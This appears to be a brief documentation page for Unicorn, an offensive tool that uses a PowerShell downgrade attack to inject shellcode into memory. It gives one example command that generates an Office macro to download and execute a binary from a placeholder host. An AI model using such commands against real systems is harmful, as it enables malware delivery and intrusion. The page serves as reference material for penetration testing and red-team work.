---
description: >-
  Unicorn is a simple tool for using a PowerShell downgrade attack and inject
  shellcode straight into memory. Based on Matthew Graeber's powershell attacks
  and the powershell bypass technique.
---

# Unicorn

## Examples

Generating a macro that will download and execute a binary:

```
python2 unicorn.py windows/download_exec url=http://badurl.com/payload.exe macro
```
